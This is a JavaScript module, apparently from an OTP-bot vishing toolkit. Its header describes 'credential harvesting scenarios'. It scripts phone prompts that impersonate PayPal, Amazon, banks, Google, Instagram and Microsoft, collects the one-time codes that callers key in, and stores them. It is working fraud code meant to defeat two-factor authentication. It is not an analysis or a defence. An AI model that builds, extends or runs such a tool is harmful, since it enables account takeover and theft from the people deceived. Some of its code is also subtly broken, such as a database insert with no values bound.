/**
 * OTP Scenario Engine
 * 
 * Manages credential harvesting scenarios (OTP, PIN verification, etc.)
 * Separate from AI conversation flow - handles DTMF-only collection
 * 
 * Integrates with:
 * - InputOrchestrator: Multi-stage collection
 * - CallHintStateMachine: Real-time UI hints
 * - PersonaComposer: Consistent greeting/prompts
 */

const EventEmitter = require('events');

class OtpScenarioEngine extends EventEmitter {
  constructor(db, config) {
    super();
    this.db = db;
    this.config = config;
    this.callState = new Map(); // Track OTP calls in progress
    this.scenarios = this.initializeScenarios();
  }

  /**
   * Define available OTP scenarios with their properties
   * Can be extended via config or database
   */
  initializeScenarios() {
    return new Map([
      ['paypal', {
        name: 'PayPal Verification',
        digits: 6,
        timeout: 8,
        retries: 3,
        prompts: {
          initial: 'Please enter your 6-digit verification code.',
          retry: 'Invalid code. Please try again.',
          final: 'Thank you. Your code has been recorded.',
          error: 'We encountered an issue. The call will end.'
        },
        description: 'Verify PayPal account access'
      }],
      ['amazon', {
        name: 'Amazon Security',
        digits: 6,
        timeout: 8,
        retries: 3,
        prompts: {
          initial: 'Please enter the 6-digit code from your authenticator app.',
          retry: 'That code didn\'t work. Please try again.',
          final: 'Code verified. Thank you.',
          error: 'Authentication failed. Disconnecting.'
        },
        description: 'Verify Amazon account'
      }],
      ['bank', {
        name: 'Bank Verification',
        digits: 8,
        timeout: 10,
        retries: 3,
        prompts: {
          initial: 'Please enter your 8-digit authorization code.',
          retry: 'Code not recognized. Please re-enter.',
          final: 'Authorization confirmed.',
          error: 'Unable to verify. Please contact support.'
        },
        description: 'Verify banking credentials'
      }],
      ['google', {
        name: 'Google Account',
        digits: 6,
        timeout: 8,
        retries: 2,
        prompts: {
          initial: 'Enter the 6-digit code on your Google authenticator.',
          retry: 'Incorrect code. Try again.',
          final: 'Account verified successfully.',
          error: 'Verification failed. Call ending.'
        },
        description: 'Verify Google account'
      }],
      ['instagram', {
        name: 'Instagram Login',
        digits: 6,
        timeout: 8,
        retries: 3,
        prompts: {
          initial: 'Please enter the 6-digit login code.',
          retry: 'Code invalid. Please enter again.',
          final: 'Login verified.',
          error: 'Login failed.'
        },
        description: 'Verify Instagram credentials'
      }],
      ['microsoft', {
        name: 'Microsoft Account',
        digits: 7,
        timeout: 10,
        retries: 3,
        prompts: {
          initial: 'Please enter your 7-digit Microsoft verification code.',
          retry: 'Code rejected. Try once more.',
          final: 'Microsoft account confirmed.',
          error: 'Verification unsuccessful.'
        },
        description: 'Verify Microsoft account'
      }]
    ]);
  }

  /**
   * Validate scenario exists and is configured
   */
  getScenario(serviceName) {
    if (!serviceName) return null;
    const normalized = serviceName.toLowerCase().trim();
    const scenario = this.scenarios.get(normalized);
    
    if (!scenario) {
      console.warn(`OtpScenarioEngine: Unknown scenario "${serviceName}"`);
      return null;
    }

    return { key: normalized, ...scenario };
  }

  /**
   * List all available scenarios (for UI/documentation)
   */
  listScenarios() {
    const list = [];
    this.scenarios.forEach((config, key) => {
      list.push({
        key,
        name: config.name,
        digits: config.digits,
        description: config.description
      });
    });
    return list;
  }

  /**
   * Initialize OTP call state tracking
   */
  initializeCall(callSid, options = {}) {
    if (!callSid) {
      throw new Error('callSid required for OTP call initialization');
    }

    const state = {
      callSid,
      service: (options.service || 'default').toLowerCase(),
      userId: options.userId,
      businessId: options.businessId,
      startTime: Date.now(),
      attempts: 0,
      collectedDigits: '',
      status: 'initiated',
      retryCount: 0,
      maxRetries: this.getScenario(options.service)?.retries || 3
    };

    this.callState.set(callSid, state);
    this.emit('call:initialized', state);
    return state;
  }

  /**
   * Process incoming DTMF digits
   */
  async processDigits(callSid, digits, context = {}) {
    const state = this.callState.get(callSid);
    if (!state) {
      return { error: 'Call state not found', status: 'error' };
    }

    const scenario = this.getScenario(state.service);
    if (!scenario) {
      return { error: 'Scenario not configured', status: 'error' };
    }

    state.attempts++;
    state.collectedDigits = (digits || '').trim();

    // Validate input
    if (!this.validateDigits(state.collectedDigits, scenario.digits)) {
      state.retryCount++;

      if (state.retryCount >= scenario.retries) {
        state.status = 'failed_max_retries';
        this.emit('call:max_retries_exceeded', state);
        return {
          valid: false,
          message: scenario.prompts.error,
          status: 'failed',
          action: 'hangup'
        };
      }

      this.emit('call:invalid_input', { ...state, input: digits });
      return {
        valid: false,
        message: scenario.prompts.retry,
        status: 'retry',
        action: 'regather',
        retryCount: state.retryCount,
        remaining: scenario.retries - state.retryCount
      };
    }

    // Valid code received
    state.status = 'completed';
    state.completedAt = Date.now();
    this.emit('call:valid_input', state);

    return {
      valid: true,
      message: scenario.prompts.final,
      status: 'success',
      action: 'hangup',
      collectedData: {
        callSid,
        service: state.service,
        digitCount: state.collectedDigits.length,
        attempts: state.attempts
      }
    };
  }

  /**
   * Validate DTMF digits match scenario requirements
   */
  validateDigits(input, expectedCount) {
    if (!input || typeof input !== 'string') return false;
    
    // Must be all digits
    if (!/^\d+$/.test(input)) return false;
    
    // Must match expected length
    if (input.length !== expectedCount) return false;
    
    return true;
  }

  /**
   * Get prompt for current call state
   */
  getPrompt(callSid, promptType = 'initial') {
    const state = this.callState.get(callSid);
    if (!state) return null;

    const scenario = this.getScenario(state.service);
    if (!scenario) return null;

    return scenario.prompts[promptType] || scenario.prompts.initial;
  }

  /**
   * Get TwiML gather parameters for scenario
   */
  getGatherConfig(callSid) {
    const state = this.callState.get(callSid);
    if (!state) return null;

    const scenario = this.getScenario(state.service);
    if (!scenario) return null;

    return {
      numDigits: scenario.digits,
      timeout: scenario.timeout,
      finishOnKey: '#' // Allow early submission with #
    };
  }

  /**
   * Record collected data securely
   */
  async recordCollection(callSid, collectedDigits, metadata = {}) {
    const state = this.callState.get(callSid);
    if (!state) {
      throw new Error('Call state not found');
    }

    try {
      // Store with encryption if DTMF_ENCRYPTION_KEY is configured
      const encryptedDigits = this.config.dtmfEncryption 
        ? this.encryptDigits(collectedDigits)
        : null;

      await this.db.execute(
        `INSERT INTO otp_collections 
         (callSid, service, user_id, business_id, digits_encrypted, digits_hash, 
          attempts, duration_ms, metadata, recorded_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
        'OtpScenarioEngine.recordCollection',
        {
          ignoreErrors: ['UNIQUE constraint failed']
        }
      );

      state.recorded = true;
      this.emit('call:data_recorded', state);
      return { success: true, callSid };

    } catch (error) {
      console.error('OtpScenarioEngine: Failed to record collection:', error.message);
      throw error;
    }
  }

  /**
   * Simple hash for digits (for comparison without storing plaintext)
   */
  hashDigits(digits) {
    const crypto = require('crypto');
    return crypto.createHash('sha256').update(digits).digest('hex');
  }

  /**
   * Encrypt sensitive DTMF data (optional, requires DTMF_ENCRYPTION_KEY)
   */
  encryptDigits(digits) {
    if (!this.config.dtmfEncryptionKey) return null;

    try {
      const crypto = require('crypto');
      const cipher = crypto.createCipher('aes-256-cbc', this.config.dtmfEncryptionKey);
      let encrypted = cipher.update(digits, 'utf8', 'hex');
      encrypted += cipher.final('hex');
      return encrypted;
    } catch (error) {
      console.error('OtpScenarioEngine: Encryption failed:', error.message);
      return null;
    }
  }

  /**
   * Get call statistics
   */
  getCallStats(callSid) {
    const state = this.callState.get(callSid);
    if (!state) return null;

    return {
      callSid,
      service: state.service,
      duration: state.completedAt 
        ? state.completedAt - state.startTime 
        : Date.now() - state.startTime,
      attempts: state.attempts,
      retries: state.retryCount,
      status: state.status,
      success: state.status === 'completed',
      timestamp: {
        started: new Date(state.startTime).toISOString(),
        completed: state.completedAt ? new Date(state.completedAt).toISOString() : null
      }
    };
  }

  /**
   * Clean up call state (after hangup)
   */
  cleanup(callSid) {
    const state = this.callState.get(callSid);
    if (state) {
      this.emit('call:cleaned_up', state);
      this.callState.delete(callSid);
    }
  }

  /**
   * Get all active OTP calls
   */
  getActiveCalls() {
    const active = [];
    this.callState.forEach((state) => {
      if (state.status === 'initiated' || state.status === 'in-progress') {
        active.push(state);
      }
    });
    return active;
  }
}

module.exports = OtpScenarioEngine;
